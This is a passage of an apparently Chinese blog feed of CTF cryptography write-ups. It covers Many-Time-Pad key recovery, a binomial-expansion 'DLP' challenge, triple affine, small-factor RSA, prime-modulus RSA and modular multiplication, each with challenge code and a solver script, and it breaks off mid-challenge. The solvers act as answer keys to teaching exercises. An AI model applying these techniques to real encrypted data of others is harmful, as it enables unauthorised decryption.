于是就可以拿到明文。整个过程只需要传送一次密钥，这是很方便的。这种方式称为 Many-Time-Pad (MTP).MTP是不安全的。</p><p>运用的规律：我们可以注意到一个至关重要的规律：小写字母 xor 空格，会得到对应的大写字母；大写字母 xor 空格，会得到小写字母！所以，如果 x⊕y 得到一个英文字母，那么 x,y 中的某一个有很大概率是空格。再来回头看上面 C1 xor 其他密文——也就等于 M1 xor 其他明文的表，如果第 col 列存在大量的英文字母，我们可以猜测 M1[col] 是一个空格。那一列英文字母越多，把握越大。知道明文是空格，知道密文则可推得密钥</p><p>MTP攻击具体实施：</p><p>对于每一条密文Ci，拿去异或其他所有密文。然后去数每一列有多少个英文字符，作为“Mi在这一位是空格”的评分。上面的事情做完时候，依据评分从大到小排序，依次利用 “某个明文的某一位是空格” 这种信息恢复出所有明文的那一列。如果产生冲突，则舍弃掉评分小的。</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> Crypto.Util.strxor <span class="hljs-keyword">as</span> xo<br><span class="hljs-keyword">import</span> libnum, codecs, numpy <span class="hljs-keyword">as</span> np<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">isChr</span>(<span class="hljs-params">x</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;a&#x27;</span>) &lt;= x <span class="hljs-keyword">and</span> x &lt;= <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;z&#x27;</span>): <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;A&#x27;</span>) &lt;= x <span class="hljs-keyword">and</span> x &lt;= <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;Z&#x27;</span>): <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">infer</span>(<span class="hljs-params">index, pos</span>):<br>    <span class="hljs-keyword">if</span> msg[index, pos] != <span class="hljs-number">0</span>:<br>        <span class="hljs-keyword">return</span><br>    msg[index, pos] = <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27; &#x27;</span>)<br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(c)):<br>        <span class="hljs-keyword">if</span> x != index:<br>            msg[x][pos] = xo.strxor(c[x], c[index])[pos] ^ <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27; &#x27;</span>)<br><br>dat = []<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getSpace</span>():<br>    <span class="hljs-keyword">for</span> index, x <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(c):<br>        res = [xo.strxor(x, y) <span class="hljs-keyword">for</span> y <span class="hljs-keyword">in</span> c <span class="hljs-keyword">if</span> x!=y]<br>        f = <span class="hljs-keyword">lambda</span> pos: <span class="hljs-built_in">len</span>(<span class="hljs-built_in">list</span>(<span class="hljs-built_in">filter</span>(isChr, [s[pos] <span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> res])))<br>        cnt = [f(pos) <span class="hljs-keyword">for</span> pos <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(x))]<br>        <span class="hljs-keyword">for</span> pos <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(x)):<br>            dat.append((f(pos), index, pos))<br><br>c = [codecs.decode(x.strip().encode(), <span class="hljs-string">&#x27;hex&#x27;</span>) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;cipher.txt&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>).readlines()]<br><br>msg = np.zeros([<span class="hljs-built_in">len</span>(c), <span class="hljs-built_in">len</span>(c[<span class="hljs-number">0</span>])], dtype=<span class="hljs-built_in">int</span>)<br><br>getSpace()<br><br>dat = <span class="hljs-built_in">sorted</span>(dat)[::-<span class="hljs-number">1</span>]<br><span class="hljs-keyword">for</span> w, index, pos <span class="hljs-keyword">in</span> dat:<br>    infer(index, pos)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">know</span>(<span class="hljs-params">index, pos, ch</span>):<br>    msg[index, pos] = <span class="hljs-built_in">ord</span>(ch)<br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(c)):<br>        <span class="hljs-keyword">if</span> x != index:<br>            msg[x][pos] = xo.strxor(c[x], c[index])[pos] ^ <span class="hljs-built_in">ord</span>(ch)<br><br>know(<span class="hljs-number">10</span>, <span class="hljs-number">21</span>, <span class="hljs-string">&#x27;y&#x27;</span>)<br>know(<span class="hljs-number">8</span>, <span class="hljs-number">14</span>, <span class="hljs-string">&#x27;n&#x27;</span>)<br>key = xo.strxor(c[<span class="hljs-number">0</span>], <span class="hljs-string">&#x27;&#x27;</span>.join([<span class="hljs-built_in">chr</span>(c) <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> msg[<span class="hljs-number">0</span>]]).encode())<br><span class="hljs-built_in">print</span>(key)<br></code></pre></td></tr></table></figure><h2 id="10-DLP"><a href="#10-DLP" class="headerlink" title="10.DLP?"></a>10.DLP?</h2><p>描述：离散对数问题? 但是…</p><p>提示：二项式展开，模式或许可以n、n^2、n^3</p><p>题目：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2 <span class="hljs-keyword">as</span> gp<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> secert <span class="hljs-keyword">import</span> flag<br>m=bytes_to_long(flag)<br>p,q=getPrime(<span class="hljs-number">1024</span>),getPrime(<span class="hljs-number">1024</span>)<br>n=p*q<br>c=<span class="hljs-built_in">pow</span>(n+<span class="hljs-number">1</span>,m,n**<span class="hljs-number">3</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;n=&#x27;</span>,n)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;c=&#x27;</span>,c)<br><span class="hljs-comment"># n= 25424528360154935630621954567981915528515510177115872717301371350764540555295643016333419049308538242523364615191329120628324299734427721053265395040553112621760406309118618417002214697458592757195655266246814059250842123140167694007221252207778102016049042517184495273872127513059848753544382939034072596823598849580401437853387572275696868112267863126070398306414562225663890652897402355193467853214939990578099614623779166739841325773644894450982467593558625714857123301664840679363030134922275491981312120964732539242661501800635508796906978673453264632165978504539677304965112001044601663248347888297398578682039</span><br><span class="hljs-comment"># c= 1013797039663501799470392506735848284002917224549859569876990038714495093829190847228348894339946866915726266814599678700680010443143887911113714286199415122087271662214271830184681759579388307709394002110318238721521767190989730911234640195805127915007272277325711784269962864277473128643704704168834030393695449857243685353896047580645079306112914182435967301639315145015712222429797832830474402291935551611701280924897093844804990348888383999824162176906467661179272435467785465343235242009210509966599166005133356744084163364998404823756323296731371150756653812406451454179780576121031411669075698822452393478627048771578310376003879992770829889727546765407052167975591270276155386262760933738692644318498102305087909196426244560372665581139801152601189510556902122433474061397686719466810907537849998427710896728467531000194608596490105574180982917470973181417555724357573508314721184292558728752386500642709376787817419803556023631178241523487134093539553021672775180094963559390188357317963208827958148013079764704632091396809799325198978813122353365771382689440344835668988949467096524148593612891205737710768904671705939715105130520445998440568809672556465828257648281341939691819889771909063052645701711788457961281748700157313667758539527484060134373159107257135028617428301925114186190988792262503920652709123167499157154611288754594295805623075986618947812737402795868007427077282896895368505169076372408276293836711817858</span><br></code></pre></td></tr></table></figure><p>思路：</p><p>开始以为是离散对数问题，但函数跑不出来，题目也说不是离散对数问题，要二项式展开</p><p>推导：</p><script type="math/tex; mode=display">c=(n+1)^m\%n^3=C_m^2n^2+C_m^1n+1</script><script type="math/tex; mode=display">=(m(m-1)/2)n^2+mn+1</script><p>已知c,n解方程可求出m</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> z3 <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br>m=Int(<span class="hljs-string">&#x27;m&#x27;</span>)<br>c=Int(<span class="hljs-string">&#x27;c&#x27;</span>)<br>n=Int(<span class="hljs-string">&#x27;n&#x27;</span>)<br>s=Solver()<br>s.add(c==<span class="hljs-number">1013797039663501799470392506735848284002917224549859569876990038714495093829190847228348894339946866915726266814599678700680010443143887911113714286199415122087271662214271830184681759579388307709394002110318238721521767190989730911234640195805127915007272277325711784269962864277473128643704704168834030393695449857243685353896047580645079306112914182435967301639315145015712222429797832830474402291935551611701280924897093844804990348888383999824162176906467661179272435467785465343235242009210509966599166005133356744084163364998404823756323296731371150756653812406451454179780576121031411669075698822452393478627048771578310376003879992770829889727546765407052167975591270276155386262760933738692644318498102305087909196426244560372665581139801152601189510556902122433474061397686719466810907537849998427710896728467531000194608596490105574180982917470973181417555724357573508314721184292558728752386500642709376787817419803556023631178241523487134093539553021672775180094963559390188357317963208827958148013079764704632091396809799325198978813122353365771382689440344835668988949467096524148593612891205737710768904671705939715105130520445998440568809672556465828257648281341939691819889771909063052645701711788457961281748700157313667758539527484060134373159107257135028617428301925114186190988792262503920652709123167499157154611288754594295805623075986618947812737402795868007427077282896895368505169076372408276293836711817858</span>)<br>s.add(n==<span class="hljs-number">25424528360154935630621954567981915528515510177115872717301371350764540555295643016333419049308538242523364615191329120628324299734427721053265395040553112621760406309118618417002214697458592757195655266246814059250842123140167694007221252207778102016049042517184495273872127513059848753544382939034072596823598849580401437853387572275696868112267863126070398306414562225663890652897402355193467853214939990578099614623779166739841325773644894450982467593558625714857123301664840679363030134922275491981312120964732539242661501800635508796906978673453264632165978504539677304965112001044601663248347888297398578682039</span>)<br>s.add(((m**<span class="hljs-number">2</span>-m)/<span class="hljs-number">2</span>)*n**<span class="hljs-number">2</span>+m*n+<span class="hljs-number">1</span>==c)<br><br><span class="hljs-keyword">if</span> s.check()==sat:<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;have result&#x27;</span>)<br>res=s.model()<br><span class="hljs-built_in">print</span>(res)<br><span class="hljs-keyword">else</span>:<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;no result&#x27;</span>)<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> libnum<br>m=<span class="hljs-number">56006392793427444746447779862117603693533268621118643434448712970487239739322969857569159725300737149</span><br><span class="hljs-built_in">print</span>(libnum.n2s(m))<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>Crypto</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Crypto-Lab1</title>
    <link href="/post/Crypto-Lab1.html"/>
    <url>/post/Crypto-Lab1.html</url>
    
    <content type="html"><![CDATA[<h1 id="Crypto-Lab1"><a href="#Crypto-Lab1" class="headerlink" title="Crypto-Lab1"></a>Crypto-Lab1</h1><h2 id="1-Affine"><a href="#1-Affine" class="headerlink" title="1.Affine"></a>1.Affine</h2><p>描述：(Affine)^3 是否安全？</p><p>题目：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> random <span class="hljs-keyword">import</span> randint<br><span class="hljs-keyword">from</span> secert <span class="hljs-keyword">import</span> flag<br><span class="hljs-keyword">import</span> gmpy2 <span class="hljs-keyword">as</span> gp<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">key_gen</span>():<span class="hljs-comment">#随机生成1~127中间一个与13互素的数</span><br>    res=<span class="hljs-number">13</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        res=randint(<span class="hljs-number">1</span>,<span class="hljs-number">127</span>)<span class="hljs-comment">#随机生成1~127中的一个数(包含1和127)</span><br>        <span class="hljs-keyword">if</span> gp.gcd(res,<span class="hljs-number">127</span>)==<span class="hljs-number">1</span>:<span class="hljs-comment">#必须和127互素</span><br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">return</span> res<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Affine_Cry</span>(<span class="hljs-params">s:<span class="hljs-built_in">list</span></span>):<br>    r1,r2,r3=key_gen(),key_gen(),key_gen()<br>    l=<span class="hljs-built_in">len</span>(s)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(l):<br>        s[i]=(r3*(r2*(r1*s[i]+<span class="hljs-number">1</span>)+<span class="hljs-number">2</span>)+<span class="hljs-number">3</span>)%<span class="hljs-number">127</span><span class="hljs-comment">#对每一个字符进行3次仿射加密</span><br><br><span class="hljs-keyword">assert</span> <span class="hljs-built_in">len</span>(flag)==<span class="hljs-number">42</span><br>m=<span class="hljs-built_in">list</span>(flag)<br>Affine_Cry(m)<br><span class="hljs-built_in">print</span>(m)<br><span class="hljs-comment">#[100, 58, 8, 93, 80, 90, 97, 121, 62, 34, 41, 83, 8, 118, 69, 114, 55, 62, 118, 69, 62, 97, 97, 118, 8, 100, 107, 41, 118, 97, 100, 48, 121, 107, 97, 48, 97, 8, 107, 107, 48, 66]</span><br></code></pre></td></tr></table></figure><p>思路：</p><p>三次仿射加密并不安全，相当于一次仿射加密(n次凯撒，维吉尼亚，仿射都相当于一次)</p><p>(r3*(r2*(r1*s[i]+1)+2)+3)%127==&gt;(r3*r2*r1*s[i]+r3*r2+2*r3+3)%127==&gt;(a*s[i]+b)%127</p><p>a的取值空间是1~127中与13互素的数，b的取值空间为0~127，密钥空间很小直接爆破</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#Affine Cipher Hacker</span><br><span class="hljs-keyword">import</span> gmpy2 <span class="hljs-keyword">as</span> gp<br>L_m=[<span class="hljs-number">100</span>, <span class="hljs-number">58</span>, <span class="hljs-number">8</span>, <span class="hljs-number">93</span>, <span class="hljs-number">80</span>, <span class="hljs-number">90</span>, <span class="hljs-number">97</span>, <span class="hljs-number">121</span>, <span class="hljs-number">62</span>, <span class="hljs-number">34</span>, <span class="hljs-number">41</span>, <span class="hljs-number">83</span>, <span class="hljs-number">8</span>, <span class="hljs-number">118</span>, <span class="hljs-number">69</span>, <span class="hljs-number">114</span>, <span class="hljs-number">55</span>, <span class="hljs-number">62</span>, <span class="hljs-number">118</span>, <span class="hljs-number">69</span>, <span class="hljs-number">62</span>, <span class="hljs-number">97</span>, <span class="hljs-number">97</span>, <span class="hljs-number">118</span>, <span class="hljs-number">8</span>, <span class="hljs-number">100</span>, <span class="hljs-number">107</span>, <span class="hljs-number">41</span>, <span class="hljs-number">118</span>, <span class="hljs-number">97</span>, <span class="hljs-number">100</span>, <span class="hljs-number">48</span>, <span class="hljs-number">121</span>, <span class="hljs-number">107</span>, <span class="hljs-number">97</span>, <span class="hljs-number">48</span>, <span class="hljs-number">97</span>, <span class="hljs-number">8</span>, <span class="hljs-number">107</span>, <span class="hljs-number">107</span>, <span class="hljs-number">48</span>, <span class="hljs-number">66</span>]<br><br>result=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">127</span>):<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">127</span>):<br><span class="hljs-keyword">if</span> gp.gcd(<span class="hljs-number">13</span>,i)!=<span class="hljs-number">1</span>:<br><span class="hljs-keyword">continue</span> <br>modInverseOfKeya=gp.invert(i,<span class="hljs-number">127</span>)<br><span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> L_m:<br>s=((s-j)*modInverseOfKeya+<span class="hljs-number">127</span>)%<span class="hljs-number">127</span><br>s=<span class="hljs-built_in">chr</span>(s)<br><span class="hljs-comment">#print(s)</span><br>result=result+s<br><span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;flag&#x27;</span> <span class="hljs-keyword">in</span> result:<br><span class="hljs-built_in">print</span>(result)<br>result=<span class="hljs-string">&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><h2 id="2-ezfactor"><a href="#2-ezfactor" class="headerlink" title="2.ezfactor"></a>2.ezfactor</h2><p>描述：大素数分解有时并不困难</p><p>题目：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> secert <span class="hljs-keyword">import</span> flag<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">keygen</span>():<br>    p = getPrime(<span class="hljs-number">1024</span>)<br>    q = bytes_to_long(os.urandom(<span class="hljs-number">2</span>))<span class="hljs-comment">#随机生成2字节</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-keyword">not</span> isPrime(q):<br>        q = bytes_to_long(os.urandom(<span class="hljs-number">2</span>))<br>    <span class="hljs-keyword">return</span> p,q<br><br>m=bytes_to_long(flag)<br>e=<span class="hljs-number">0x10001</span><br>p,q=keygen()<br>n=p*q<br>c=<span class="hljs-built_in">pow</span>(m,e,n)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;n=&#x27;</span>,n)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;c=&#x27;</span>,c)<br><span class="hljs-comment"># n= 8229783461466332040985570955689140301980424477467386782207493764428206644078992349976445838337631707991443642727886750156820539190183610490062176917844491669023248777093633824546678109633432252382203985017241108128448239787809406059595749568546029370432490800939054123746059423719967181097124476474876942468351161</span><br><span class="hljs-comment"># c= 6143746983427921318185188881076441398882333455809553419069313304628661763235739758884171187022747039192562361133696665277195590152020608908277946221074099202609694055479266610603999880435019373553687281147106520059127093841243148008765446575739567066823162259495655830347380850355537592025485209198622464044712234</span><br><br></code></pre></td></tr></table></figure><p>思路：</p><p>其中一个素数为2字节，16bit,非常小，故而非常容易分解，可以自己爆破也可以用用工具</p><p>直接用yafu分解：</p><p><img src="https://testingcf.jsdelivr.net/gh/c1ongyan/picture@main/img/202211190326630.png" alt="image-20221119032649552"></p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> gmpy2 <span class="hljs-keyword">as</span> gp<br>n=<span class="hljs-number">8229783461466332040985570955689140301980424477467386782207493764428206644078992349976445838337631707991443642727886750156820539190183610490062176917844491669023248777093633824546678109633432252382203985017241108128448239787809406059595749568546029370432490800939054123746059423719967181097124476474876942468351161</span><br>c=<span class="hljs-number">6143746983427921318185188881076441398882333455809553419069313304628661763235739758884171187022747039192562361133696665277195590152020608908277946221074099202609694055479266610603999880435019373553687281147106520059127093841243148008765446575739567066823162259495655830347380850355537592025485209198622464044712234</span><br>e=<span class="hljs-number">0x10001</span><br>p=<span class="hljs-number">62497</span><br>q=<span class="hljs-number">131682856160557019392699984890300979278692168863583640530065343367332938286301620077386847982105248379785327979389198684045962833258934196682435587593716365089896295455680013833410853475101720920719458294273982881233471043215024818144802943638031095419499988814487961402084250823559005729829023416722033737113</span><br>phi=(q-<span class="hljs-number">1</span>)*(p-<span class="hljs-number">1</span>)<br>d=gp.invert(e,phi)<br>flag=<span class="hljs-built_in">pow</span>(c,d,n)<br><span class="hljs-built_in">print</span>(long_to_bytes(flag))<br></code></pre></td></tr></table></figure><h2 id="3-Prime-mod"><a href="#3-Prime-mod" class="headerlink" title="3.Prime mod"></a>3.Prime mod</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2 <span class="hljs-keyword">as</span> gp<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> secert <span class="hljs-keyword">import</span> flag<br>e=getPrime(<span class="hljs-number">512</span>)<br>p=getPrime(<span class="hljs-number">1024</span>)<br>m=bytes_to_long(flag)<br>c=<span class="hljs-built_in">pow</span>(m,e,p)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;c=&#x27;</span>,c)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;e=&#x27;</span>,e)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;p=&#x27;</span>,p)<br><br><span class="hljs-comment"># c= 133327844258569114782423385268106077156564211803448314839541564466859207256622234978015620106774383066510370350916612822843382282921154989837855830954942752697305123767407854567793174559042725465390576212219084059721100236607861663840080608414349900042279053253409539817390017100639962256550113241911873462912</span><br><span class="hljs-comment"># e= 8611259638920119961905186401686205052226362006494574525639626754901727333571467769045506402861514437790803724860350595398343083279790596886125135173378389</span><br><span class="hljs-comment"># p= 170104374140322234939710084370405938295676111076286677363934184480603893365056268333094218077605232052965885906672466403748787978544556639430780686424606610827455321723130337572766724054859486049454324663816700618245680457538886660516331685025224749764088385677273350765283332142806904566875443041362642294377</span><br><br></code></pre></td></tr></table></figure><p>思路：</p><p>直接用素数当模数，p的欧拉函数就是p-1,能直接解得私钥</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2 <span class="hljs-keyword">as</span> gp<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br>c=<span class="hljs-number">133327844258569114782423385268106077156564211803448314839541564466859207256622234978015620106774383066510370350916612822843382282921154989837855830954942752697305123767407854567793174559042725465390576212219084059721100236607861663840080608414349900042279053253409539817390017100639962256550113241911873462912</span><br>e=<span class="hljs-number">8611259638920119961905186401686205052226362006494574525639626754901727333571467769045506402861514437790803724860350595398343083279790596886125135173378389</span><br>p=<span class="hljs-number">170104374140322234939710084370405938295676111076286677363934184480603893365056268333094218077605232052965885906672466403748787978544556639430780686424606610827455321723130337572766724054859486049454324663816700618245680457538886660516331685025224749764088385677273350765283332142806904566875443041362642294377</span><br>d=gp.invert(e,p-<span class="hljs-number">1</span>)<br>flag=<span class="hljs-built_in">pow</span>(c,d,p)<br><span class="hljs-built_in">print</span>(long_to_bytes(flag))<br></code></pre></td></tr></table></figure><h2 id="4-Multiply"><a href="#4-Multiply" class="headerlink" title="4.Multiply"></a>4.Multiply</h2><p>描述：Mult and Mod(m.m)</p><p>题目：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> secert <span class="hljs-keyword">import</span> flag<br>m=bytes_to_long(flag)<br>c=((<span class="hljs-number">2</span>**<span class="hljs-number">500</span>)*m+<span class="hljs-number">2022</span>)%(<span class="hljs-number">20</span>**<span class="hljs-number">160</span>)<br><span class="hljs-built_in">print</span>(c)<br><span class="hljs-comment">#6875774171231308732209370800585103431132921405150397010723816545800851684752767133666693144802558976151605762562691605722606487762337997086533593690754322608045535714812817098270842657455560386948045085870054</span><br></code></pre></td></tr></table></figure><p>思路：</p><p>本质是数论的解同余式c-2022与2**500和20**160有公因数，因此可以消掉公因数</p><p>c’=a’<em>m(modn’)=&gt;m=a’(-1)\</em>c’(mod n’)</p><p>但最后要还原m还要乘上公因子</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> gmpy2<br>a=<span class="hljs-number">2</span>**<span class="hljs-number">500</span><br>n=<span class="hljs-number">20</span>**<span class="hljs-number">160</span><br>c=<span class="hljs-number">6875774171231308732209370800585103431132921405150397010723816545800851684752767133666693144802558976151605762562691605722606487762337997086533593690754322608045535714812817098270842657455560386948045085870054</span><br>c=c-<span class="hljs-number">2022</span><br>g=gmpy2.gcd(a,n)<br>a=a//g<br>c=c//g<br>n=n//g<br>a_inv=gmpy2.invert(a,n)<br>flag=(c*a_inv)%n*g<br><span class="hljs-built_in">print</span>(long_to_bytes(flag))<br></code></pre></td></tr></table></figure><h2 id="5-Same-E"><a href="#5-Same-E" class="headerlink" title="5.Same E"></a>5.Same E</h2><p>描述：共模攻击</p><p>题目：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> secert <span class="hljs-keyword">import</span> 